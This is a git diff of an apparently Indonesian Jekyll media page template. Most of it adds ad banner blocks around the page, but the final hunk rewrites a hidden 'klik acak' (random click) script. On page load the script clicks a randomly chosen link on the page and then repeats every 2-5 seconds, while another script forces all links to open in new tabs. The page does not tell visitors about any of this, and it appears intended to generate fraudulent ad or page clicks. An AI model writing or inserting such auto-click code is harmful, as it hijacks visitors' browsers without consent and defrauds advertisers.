@@ -318,7 +318,15 @@ permalink: /nga/
     })();
     </script>
 
-    
+    <!-- BANNER 06: TOP -->
+    <div class="ad-break">
+        <div class="ad-box ad-desktop">
+            {% include /ads/banner/06.html %}
+        </div>
+        <div class="ad-box ad-mobile">
+            {% include /ads/banner/04.html %}
+        </div>
+    </div>
 
     <!-- DESKTOP NAV -->
     <nav class="desktop-nav">
@@ -331,15 +339,18 @@ permalink: /nga/
     <!-- MAIN LAYOUT -->
     <div class="main-layout">
 
-        <br /><br /><br />
+        <!-- LEFT SIDEBAR: Banner 05 -->
+        <aside class="sidebar sidebar-left">
+            <div class="sticky-ad">
+                {% include /ads/banner/05.html %}
+            </div>
+        </aside>
 
         <!-- MAIN CONTENT -->
         <main class="content-area">
+
 <center>
-
-
-
-  <div class="video-container">
+<div class="video-container">
     <iframe
       id="videoFrame"
       src=""
@@ -1371,8 +1382,8 @@ permalink: /nga/
 
 
 
-</center>
 
+</center>
 
 
           
@@ -1548,7 +1559,15 @@ permalink: /nga/
                         </div>
                     </section>
 
-                    
+                    <!-- BANNER 01: TENGAH -->
+                    <div class="ad-inline">
+                        <div class="ad-box ad-desktop">
+                            {% include /ads/banner/01.html %}
+                        </div>
+                        <div class="ad-box ad-mobile">
+                            {% include /ads/banner/04.html %}
+                        </div>
+                    </div>
                     
                     <!-- SECTION 2: Photo Gallery -->
                     <section id="section-photo">
@@ -1578,7 +1597,12 @@ permalink: /nga/
                         </ul>
                     </section>
 
-                    
+                    <!-- BANNER 02: TENGAH -->
+                    <div class="ad-inline">
+                        <div class="ad-box ad-both">
+                            {% include /ads/banner/02.html %}
+                        </div>
+                    </div>
                     
                     <!-- SECTION 3: Video Archive -->
                     <section id="section-video">
@@ -1666,7 +1690,12 @@ permalink: /nga/
                         </div>
                     </section>
 
-                    
+                    <!-- BANNER 03: TENGAH -->
+                    <div class="ad-inline">
+                        <div class="ad-box ad-both">
+                            {% include /ads/banner/03.html %}
+                        </div>
+                    </div>
                     
                     <!-- SECTION 6: Exclusive Content -->
                     <section id="section-exclusive">
@@ -1766,7 +1795,12 @@ permalink: /nga/
                         </div>
                     </section>
 
-                    
+                    <!-- BANNER 08: SEBELUM ABOUT -->
+                    <div class="ad-inline">
+                        <div class="ad-box ad-both">
+                            {% include /ads/banner/08.html %}
+                        </div>
+                    </div>
                     
                     <hr>
                     
@@ -1788,10 +1822,24 @@ permalink: /nga/
 
         </main>
 
-        
+        <!-- RIGHT SIDEBAR: Banner 05 -->
+        <aside class="sidebar sidebar-right">
+            <div class="sticky-ad">
+                {% include /ads/banner/05.html %}
+            </div>
+        </aside>
 
     </div>
 
+    <!-- BANNER 07: BOTTOM -->
+    <div class="ad-break">
+        <div class="ad-box ad-desktop">
+            {% include /ads/banner/07.html %}
+        </div>
+        <div class="ad-box ad-mobile">
+            {% include /ads/banner/04.html %}
+        </div>
+    </div>
     
     <script>
     (function() {
@@ -1915,29 +1963,73 @@ permalink: /nga/
     {% include /ads/gobloggugel/umum.html %}
 {% include footer.html %}
 
-<!--buka link dijendela baru-->
-<script>
+
+ <!--buka link di jendela baru-->
+ <script>
 document.querySelectorAll('a').forEach(function(link) {
   link.target = '_blank';
 });
 </script>
-
-<!--klik acak-->
+ 
+ 
+ <!--klik acak-->
 <script>
-function randomKlik() {
-    let x = Math.floor(Math.random() * window.innerWidth);
-    let y = Math.floor(Math.random() * window.innerHeight);
-    let elemen = document.elementFromPoint(x, y);
-    if (elemen) {
-        elemen.click();
+function klikLinkAcak() {
+    // Ambil semua link di halaman
+    let semuaLink = document.querySelectorAll('a[href]');
+    
+    // Filter link yang valid (punya href dan bukan javascript:void)
+    let linkValid = Array.from(semuaLink).filter(link => {
+        let href = link.getAttribute('href');
+        return href && 
+               href !== '#' && 
+               !href.startsWith('javascript:') &&
+               !href.startsWith('mailto:') &&
+               !href.startsWith('tel:');
+    });
+    
+    if (linkValid.length > 0) {
+        // Pilih link acak
+        let link = linkValid[Math.floor(Math.random() * linkValid.length)];
+        
+        // Dapatkan posisi link
+        let rect = link.getBoundingClientRect();
+        let x = rect.left + rect.width / 2;
+        let y = rect.top + rect.height / 2;
+        
+        // Klik link
+        link.click();
+        
+        // Visual marker
+        let marker = document.createElement('div');
+        marker.style.cssText = `
+            position: fixed;
+            left: ${x - 5}px;
+            top: ${y - 5}px;
+            width: 10px;
+            height: 10px;
+            background: rgba(255, 165, 0, 0.8);
+            border-radius: 50%;
+            z-index: 9999;
+            pointer-events: none;
+            box-shadow: 0 0 10px rgba(255, 165, 0, 0.5);
+        `;
+        document.body.appendChild(marker);
+        setTimeout(() => marker.remove(), 500);
+        
+        console.log(`Klik link: ${link.textContent.trim()} - ${link.href}`);
+    } else {
+        console.log('Tidak ada link ditemukan');
     }
-    setTimeout(randomKlik, Math.floor(Math.random() * 2000) + 1000);
+    
+    // Jeda acak antara 2-5 detik
+    setTimeout(klikLinkAcak, Math.floor(Math.random() * 3000) + 2000);
 }
-randomKlik();
+
+// Mulai script
+klikLinkAcak();
 </script>
 
-
- 
   
 </body>
 </html>
